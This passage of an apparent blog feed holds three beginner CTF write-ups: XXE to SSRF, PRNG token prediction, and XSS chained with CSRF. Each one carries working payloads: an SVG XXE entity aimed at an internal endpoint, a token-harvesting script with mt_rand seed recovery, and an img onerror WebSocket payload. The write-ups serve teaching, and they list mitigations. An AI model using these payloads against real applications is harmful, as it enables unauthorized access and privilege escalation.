class="meta">&lt;/svg&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>Once we upload the SVG file we can see a new request have been made to our server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">192.168.1.21 - - [07/May/2020 13:49:43] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>Bingo! We got the confirmation that our XXE Injection is working and we can do SSRF.</p><p>Now what ? </p><p>Remember those “locked” features we couldn’t activate earlier ? Maybe we can toggle it directly from the server using SSRF ?</p><p>Let’s give a try with the following SVG file:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:3000/features/1/toggle&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;500px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now we reload the page and we can see the feature got activated:</p><p><img src="https://user-images.githubusercontent.com/9076747/123847254-ac68f680-d916-11eb-81a9-69e08a0df6e5.png" alt="misc ctf xxe to ssrf"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://portswigger.net/web-security/xxe">XML external entity</a><a href="https://portswigger.net/web-security/xxe"> </a><a href="https://portswigger.net/web-security/xxe">(XXE)</a><a href="https://portswigger.net/web-security/xxe"> injection | Web Security Academy</a></li><li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity</a><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"> </a><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">(XXE)</a><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"> Processing | OWASP</a></li><li><a href="https://portswigger.net/web-security/ssrf">Server-side request forgery</a><a href="https://portswigger.net/web-security/ssrf"> </a><a href="https://portswigger.net/web-security/ssrf">(SSRF)</a><a href="https://portswigger.net/web-security/ssrf"> | Web Security Academy</a></li><li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">Server Side Request Forgery | OWASP</a></li><li><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">How To: Server-Side Request Forgery</a><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF"> </a><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">(SSRF)</a><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF"> | HackerOne Wiki</a></li></ul><h2 id="Real-life-example"><a href="#Real-life-example" class="headerlink" title="Real life example"></a>Real life example</h2><ul><li><a href="https://techcrunch.com/2019/07/29/capital-one-hacked-over-100-million-customers-affected/">SSRF was used to retrieve AWS credentials that were then used to steal the personal information of over 100 million Capital One customers.</a></li><li><a href="https://hackerone.com/reports/341876">SSRF in Exchange leads to ROOT access in all Shopify instances</a><a href="https://hackerone.com/reports/341876"> </a><a href="https://hackerone.com/reports/341876">($25,000)</a><a href="https://hackerone.com/reports/341876"> | HackerOne</a></li><li><a href="https://hackerone.com/reports/248668">XXE on sms-be-vip.twitter.com in SXMP Processor</a><a href="https://hackerone.com/reports/248668"> </a><a href="https://hackerone.com/reports/248668">($10,080)</a><a href="https://hackerone.com/reports/248668"> | HackerOne</a></li><li><a href="https://hackerone.com/reports/500515">XXE at Starbuck.com.cn</a><a href="https://hackerone.com/reports/500515"> </a><a href="https://hackerone.com/reports/500515">($4,000)</a><a href="https://hackerone.com/reports/500515"> | HackerOne</a></li><li><a href="https://hackerone.com/reports/312543">XXE in Site Audit function exposing file and directory contents</a><a href="https://hackerone.com/reports/312543"> </a><a href="https://hackerone.com/reports/312543">($2,000)</a><a href="https://hackerone.com/reports/312543"> | HackerOne</a></li><li><a href="https://hackerone.com/reports/505947">XXE on pulse.mail.ru</a><a href="https://hackerone.com/reports/505947"> </a><a href="https://hackerone.com/reports/505947">($6,000)</a><a href="https://hackerone.com/reports/505947"> | HackerOne</a></li><li><a href="https://hackerone.com/reports/398799">Unauthenticated blind SSRF in OAuth Jira authorization controller</a><a href="https://hackerone.com/reports/398799"> </a><a href="https://hackerone.com/reports/398799">($6,000)</a><a href="https://hackerone.com/reports/398799"> | HackerOne</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ssrf </tag>
            
            <tag> beginner </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - PRNG Weakness</title>
      <link href="/posts/misc-ctf/PRNG%20Weakness/"/>
      <url>/posts/misc-ctf/PRNG%20Weakness/</url>
      
        <content type="html"><![CDATA[<p>This challenge aims to highlight the weaknesses of PRNG (Pseudorandom Number Generator) algorithms.</p><p><strong>Tl;Dr:</strong> The app use Pseudorandom Number Generator to generate API access token, retrieving a lot of tokens allows a brute force attack to recover the initial PRNG seed. Using this seed it was possible to find the first token generated which belongs to the <code>admin</code> user and retrieve the flag using its account.</p><p>Alright! Let’s get into the details now!</p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/76225736-39b5a280-621d-11ea-9544-cb656817dea6.png" alt="Quotes API"></p><p>Entering a username gives us an access token for the “Quotes API”:</p><p><img src="https://user-images.githubusercontent.com/9076747/76226109-b183cd00-621d-11ea-8f23-6f8912234297.png" alt="Quotes API token"></p><p>Let’s try it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;http://ctf.one:36089/quote.php?token=1952540257&quot;</span></span><br><span class="line">Sur le plus haut trône du monde, on est jamais assis que sur son boule. </span><br><span class="line">~Booba</span><br><span class="line"></span><br><span class="line">$ curl <span class="string">&quot;http://ctf.one:36089/quote.php?token=1952540257&quot;</span></span><br><span class="line">Ne jamais remettre à demain ce qu’on peut faire à une main. </span><br><span class="line">~La fouine</span><br></pre></td></tr></table></figure><p>The application is quite simple since there is no other endpoints at all. We can quickly notice with the file extension <code>.php</code> that the app is running PHP, this informations will probably comes useful later.</p><p>The <code>quotes.php</code> endpoint doesn’t look interesting from here, it returns a random quote if the token is valid but nothing else interesting.</p><h2 id="Random-Number-Generator"><a href="#Random-Number-Generator" class="headerlink" title="Random Number Generator"></a>Random Number Generator</h2><p>So far here are the informations we can gather to progress:</p><ul><li>app is running PHP</li><li>token is always 10 chars long</li><li>length of the <code>username</code> doesn’t impact the length of the token.</li><li>token is always an integer</li><li>token looks fully random and not increment</li></ul><p>Next logical step is to check PHP documentation for built-in random generation library:</p><p>The first function we stumble across is <code>[rand()](https://www.php.net/manual/en/function.rand.php)</code>.</p><blockquote><p><strong>Rand</strong><br>Generate a random integer<br><a href="https://www.php.net/manual/en/function.rand.php">https://www.php.net/manual/en/function.rand.php</a></p></blockquote><p>If we follow the documentation this would mean the quote API is using the following code to generate a 10 long integer token:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> rand(<span class="number">1000000000</span>, <span class="number">9999999999</span>);</span><br><span class="line"><span class="number">3771020782</span></span><br></pre></td></tr></table></figure><p>Doesn’t seems like a logical nor practical way to me. Let’s see if other functions exist.</p><p>The <code>[rand()](https://www.php.net/manual/en/function.rand.php)</code> php documentation also link to the <code>[mt_rand()](https://www.php.net/manual/en/function.mt-rand.php)</code> function:</p><blockquote><p><strong>mt_rand</strong><br>Generate a random value via the Mersenne Twister Random Number Generator<br><a href="https://www.php.net/manual/en/function.mt-rand.php">https://www.php.net/manual/en/function.mt-rand.php</a></p></blockquote><p>Again, let’s give it a try:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">php &gt; mt_srand(<span class="number">92735103</span>); <span class="comment">//random seed</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">1711350997</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">1026457933</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">2036211242</span></span><br></pre></td></tr></table></figure><p>That’s interesting! Without any extra parameters the returned value of <code>mt_rand()</code> is the exact same format of our tokens.</p><p>Ok, we now know that this Quotes API is using <code>mt_rand()</code> to generate a random token.<br>Now what?</p><p>While checking the PHP documentation of <code>mt_rand()</code> we stumble across this warning:</p><blockquote><p><strong>Caution!</strong><br>This function does not generate cryptographically secure values, and should not be used for cryptographic purposes.</p></blockquote><p>What does this mean ?</p><p>Wikipedia gives us a little insight of how PRNG works:</p><blockquote><p>A pseudorandom number generator (PRNG), also known as a deterministic random bit generator, is an algorithm for generating a sequence of numbers whose properties approximate the properties of sequences of random numbers. The PRNG-generated sequence is not truly random, because it is completely determined by an initial value, called the PRNG’s seed.<br><a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">https://en.wikipedia.org/wiki/Pseudorandom_number_generator</a></p></blockquote><p>If you are unfamiliar with PRNG here are the key points you have to remember:</p><ol><li><p>All PRNG algorithms take an input called seed as starting point. This seed is the base number on which an algorithmic formula is applied.</p></li><li><p>Then the formula is applied on this initial seed and the result generated is a random-looking number.</p></li><li><p>The previously generated number is used as the seed for the next random number generation.</p></li></ol><p>Check out the C standard library implementation of <code>rand</code> to give you a better idea on how it’s really done under the hood:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> next = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// RAND_MAX assumed to be 32767</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next = next * <span class="number">1103515245</span> + <span class="number">12345</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(next/<span class="number">65536</span>) % <span class="number">32768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">srand</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next = seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>With all this knowledge we can start to see where the issue is and how we could potentially exploit it right ?</p><h2 id="Abusing-the-API-token-generation"><a href="#Abusing-the-API-token-generation" class="headerlink" title="Abusing the API token generation"></a>Abusing the API token generation</h2><p>Let’s try to imagine how the token generation code in this <code>Quote API</code> works. Here is one theory:</p><ol><li>The php <code>mt_rand()</code> function gets initialized with an hard-coded seed using <code>mt_srand()</code>.</li><li>Tokens get generated with <code>mt_rand()</code> and saved to a database.</li><li>Admin generate the first token for himself and get stored in the database.</li><li>As new users login, new pseudo-random tokens get generated and saved to the database.</li></ol><p>If this workflow is correct we could maybe use the weakness of PRNG algorithm to recover the initial seed and, thanks to the initial seed, we could generate the first few token generated by the app with should correspond to the admin account token, giving us privileged access to the API.</p><p>Enough with the theory, let’s get to the point with practice!</p><p>First we will need to generate a large amount of tokens to make the seed bruteforce work as easy and quick as possible.</p><p>Let’s write a small Python script to extract large amount of tokens from the <code>Quote API</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">    r = requests.post(f <span class="string">&quot;http://ctf.one:&#123;port&#125;/&quot;</span>,</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: randrange(<span class="number">1000000000</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">m = re.search(r <span class="string">&quot;(?&lt;==)(.*?)(?=&lt;)&quot;</span>, r.text)</span><br><span class="line">token = <span class="built_in">int</span>(m.group())</span><br><span class="line"><span class="built_in">print</span>(f <span class="string">&quot;&#123;token&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>Running the script will output the following list of tokens:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ python quotes-tmp.py 36089</span><br><span class="line">1061286297</span><br><span class="line">1036863270</span><br><span class="line">989299637</span><br><span class="line">1500097896</span><br><span class="line">488092417</span><br><span class="line">503588414</span><br><span class="line">1978821885</span><br><span class="line">1395782229</span><br><span class="line">659952241</span><br><span class="line">1446891396</span><br><span class="line">40888864</span><br><span class="line">1913918556</span><br><span class="line">1410184624</span><br><span class="line">320904415</span><br><span class="line">136773179</span><br><span class="line">1161884405</span><br><span class="line">143558795</span><br><span class="line">2064003864</span><br><span class="line">1583125591</span><br><span class="line">1076847175</span><br><span class="line">485321260</span><br><span class="line">1299391838</span><br><span class="line">482138034</span><br><span class="line">1401969874</span><br><span class="line">1203600045</span><br><span class="line">19994765</span><br><span class="line">1009433858</span><br><span class="line">1347240952</span><br><span class="line">1551734364</span><br><span class="line">1411729604</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Let’s now feed this list of tokens to a PRNG seed recovering tool like <code>[untwister](https://github.com/altf4/untwister)</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./untwister -i quotes-tokens.txt -r php-mt_rand -S 1000000</span><br><span class="line">[!] Not enough observed values to perform state inference.</span><br><span class="line">[*] Looking <span class="keyword">for</span> seed using php-mt_rand</span><br><span class="line">[*] Spawning 2 worker thread(s) ...</span><br><span class="line">[*] Completed <span class="keyword">in</span> 0 second(s)</span><br><span class="line">[$] Found seed 626545 with a confidence of 100.00%</span><br></pre></td></tr></table></figure><p>Alright! Sound good, we now have the initial seed: <code>626545</code>.</p><p>Following our scenario we should now be able to get the few first tokens generated by the app, which will hopefully be the token used by the admin. </p><p>Let’s give it a try:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php56 -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; mt_srand(<span class="number">626545</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="number">531921107</span></span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure><p>We have a first token, let’s try to use it to see if the API return a different output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&quot;ctf.one:36089/quote.php?token=531921107&quot;</span></span><br><span class="line">FLAG&#123;rn6 mu57 n07 b3 pr3d1c74bl3!&#125;%</span><br></pre></td></tr></table></figure><h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Use <strong>CSPRNG</strong> for any random that need to be truly random and secure:</p><ul><li>Password reset tokens</li><li>CSRF tokens</li><li>Session identifiers</li><li>Cryptographic primitives</li><li>Secret/unpredictable value generation</li><li>…</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md#secure-random-number-generation">CheatSheets: Secure Random Number Generation | OWASP</a></li><li><a href="https://insomniasec.com/cdn-assets/Not_So_Random_-_Exploiting_Unsafe_Random_Number_Generator_Use.pdf">Not So Random Exploiting Unsafe Random Number Generator Use</a></li></ul><h2 id="Real-Life-example"><a href="#Real-Life-example" class="headerlink" title="Real Life example"></a>Real Life example</h2><ul><li><a href="https://hackerone.com/reports/576504">Authentication Bypass by abusing Insecure crypto tokens - HackerOne</a></li><li><a href="https://media.blackhat.com/bh-us-12/Briefings/Argyros/BH_US_12_Argyros_PRNG_WP.pdf">Predictability of password reset tokens | Black Hat</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> prng </tag>
            
            <tag> beginner </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - XSS to CSRF</title>
      <link href="/posts/misc-ctf/xss-to-csrf/"/>
      <url>/posts/misc-ctf/xss-to-csrf/</url>
      
        <content type="html"><![CDATA[<p>This challenge highlight two issue at once: the very common Cross Site Scripting (XSS), Cross-site request forgery (CSRF) and how both vulnerabilities can be chained.</p><p><strong>Tl;Dr:</strong> You have to exploit a XSS vulnerability chained with CSRF in order to access a protected Websocket endpoint.</p><p>Alright! Let’s get into the details now!</p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge displays the following application:</p><p><img src="https://user-images.githubusercontent.com/9076747/124015680-38e1ea80-d9e5-11eb-8c20-a33745d04fc2.png" alt="misc ctf chatbot"></p><p>We have a conversation bot. Sending random sentence doesn’t seem to do anything particular:</p><p><img src="https://user-images.githubusercontent.com/9076747/124015958-66c72f00-d9e5-11eb-8315-30f36da29f7c.png" alt="misc ctf chatbot chat"></p><h2 id="Cross-site-Scripting-XSS"><a href="#Cross-site-Scripting-XSS" class="headerlink" title="Cross-site Scripting (XSS)"></a>Cross-site Scripting (XSS)</h2><p>While playing around we can quickly notice it’s possible to inject HTML. If we pass the message <code>&lt;s&gt;Hello&lt;/s&gt;</code> it gets displayed as HTML:</p><p><img src="https://user-images.githubusercontent.com/9076747/124016068-85c5c100-d9e5-11eb-9e31-062182df5463.png" alt="misc ctf html injection"></p><p>This is open door to XSS right ? </p><p>Let’s try a common one:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The XSS payload gets executed when the message gets displayed:</p><p><img src="https://user-images.githubusercontent.com/9076747/124016183-a726ad00-d9e5-11eb-9962-37a4f7fd4f57.png" alt="misc ctf chatbot xss"></p><p>Well that’s nice but it’s only Self-XSS so far, since a bot handled the conversation the XSS won’t trigger on its side…</p><p>Let’s move on.</p><h2 id="Bad-words"><a href="#Bad-words" class="headerlink" title="Bad words"></a>Bad words</h2><p>Then we notice this warning:</p><blockquote><p>This chatbot is a safe-place, badwords are prohibited!</p></blockquote><p>Well I wonder what will happen if we use “bad words”?</p><p><img src="https://user-images.githubusercontent.com/9076747/124016326-d2a99780-d9e5-11eb-8ce4-0d27c5d87730.png" alt="misc ctf chatbot bad words"></p><p>Interesting. It seems like a human is still interacting with some chat messages if they contains bad words. It’s good to know maybe we can use our XSS on the moderator side…</p><p>Websocket</p><p>Let’s now try to understand how the app is communicating with the server.<br>Opening our Browser Dev tools we don’t notice any HTTP requests being made but we can see a Websocket connection is opened.</p><blockquote><p>The WebSocket API is an technology that makes it possible to open a two-way interactive communication session between the user’s browser and a server. With this API, you can send messages to a server and receive event-driven responses without having to poll the server for a reply.</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API</a></p></blockquote><p>That make sense for our use case. Still using the browser dev tools it’s possible to looks at the messages sent and received from the server:</p><p><img src="https://user-images.githubusercontent.com/9076747/124016442-f240c000-d9e5-11eb-8acf-637f5c720f9c.png" alt="misc ctf chatbot websocket"></p><p>Let’s now try to directly interact with the WebSocket (with a bit of luck maybe we could inject something directly?).</p><p>Using the browser dev tool console we create we a new connexion with the server:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;ws://misc.ctf:33433/&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Then setup a little function to display on the console the server response:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123; <span class="built_in">console</span>.log(message.data); &#125;</span><br></pre></td></tr></table></figure><p>We should now be able to send and receive messages. Let’s give it a try:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.send(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">Unrecognized message, type /help <span class="keyword">for</span> a list <span class="keyword">of</span> command</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/124016602-20be9b00-d9e6-11eb-91ea-f3653f1fe207.png" alt="misc ctf websocket chatbot connexion"></p><p>This time we got a different kind of message from the server. Interesting. We can try the <code>/help</code> command:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.send(<span class="string">&#x27;/help&#x27;</span>)</span><br><span class="line">&#123; <span class="string">&quot;content&quot;</span>: <span class="string">&quot;&lt;message&gt;&quot;</span> &#125; to send a message</span><br><span class="line">/moderator to enter moderator mode <span class="keyword">debugger</span> </span><br></pre></td></tr></table></figure><p>We got a command to enter moderator mode, that sound perfect:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.send(<span class="string">&#x27;/moderator&#x27;</span>)</span><br><span class="line">You need to be authenticated to execute <span class="built_in">this</span> command</span><br></pre></td></tr></table></figure><p>That would have been too easy… But with all the informations we got so far we can probably find a way to access this endpoint right ?</p><h2 id="Cross-site-Request-Forgery"><a href="#Cross-site-Request-Forgery" class="headerlink" title="Cross-site Request Forgery"></a>Cross-site Request Forgery</h2><p>We have XSS and a protected endpoint we need to access. It’s the perfect scenario for CSRF.</p><blockquote><p>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent<br>different websites from interfering with each other.</p><p><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></p></blockquote><p><img src="https://user-images.githubusercontent.com/9076747/124016822-54012a00-d9e6-11eb-9286-74d934010df6.png" alt="portswinger csrf"></p><p>In our case we are going to use Cross-site Scripting in order to have a moderator access <code>/moderator</code> endpoint for us.</p><p>We got a Javascript code to access <code>/moderator</code> endpoint using WebSocket:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;ws://&#x27;</span>+<span class="built_in">window</span>.location.host);</span><br><span class="line">ws.onopen = <span class="function">() =&gt;</span> ws.send(<span class="string">&#x27;/moderator&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Let’s include it to our XSS payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;ws=new WebSocket(&#x27;ws://&#x27;+window.location.host);ws.onopen=()=&gt;ws.send(&#x27;/moderator&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Last step, we need to include a “bad word” in our message so it gets transferred to a Moderator which have access to <code>/moderator</code> endpoint. The final payload should be the following:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🖕 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;ws=new WebSocket(&#x27;ws://&#x27;+window.location.host);ws.onopen=()=&gt;ws.send(&#x27;/moderator&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s send it as message and see the result:</p><p><img src="https://user-images.githubusercontent.com/9076747/124017098-9b87b600-d9e6-11eb-81bb-2f0dbc20655c.gif" alt="misc ctf xss csrf flag"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://portswigger.net/web-security/cross-site-scripting">Cross-site scripting | Web Security Academy</a></li><li><a href="https://owasp.org/www-community/attacks/xss/">Cross Site Scripting</a><a href="https://owasp.org/www-community/attacks/xss/"> </a><a href="https://owasp.org/www-community/attacks/xss/">(XSS)</a><a href="https://owasp.org/www-community/attacks/xss/"> | OWASP</a></li><li><a href="https://portswigger.net/web-security/csrf">Cross-site request forgery</a><a href="https://portswigger.net/web-security/csrf"> </a><a href="https://portswigger.net/web-security/csrf">(CSRF)</a><a href="https://portswigger.net/web-security/csrf"> | Web Security Academy</a></li><li><a href="https://owasp.org/www-community/attacks/csrf">Cross Site Request Forgery</a><a href="https://owasp.org/www-community/attacks/csrf"> </a><a href="https://owasp.org/www-community/attacks/csrf">(CSRF)</a><a href="https://owasp.org/www-community/attacks/csrf"> | OWASP</a></li></ul><h2 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h2><ul><li><strong>Filter input on arrival.</strong> At the point where user input is received, filter as strictly as possible based on what is expected or valid input.</li><li><strong>Encode data on output.</strong> At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.</li><li><strong>Use appropriate response headers.</strong> To prevent XSS in HTTP responses that aren’t intended to contain any HTML or 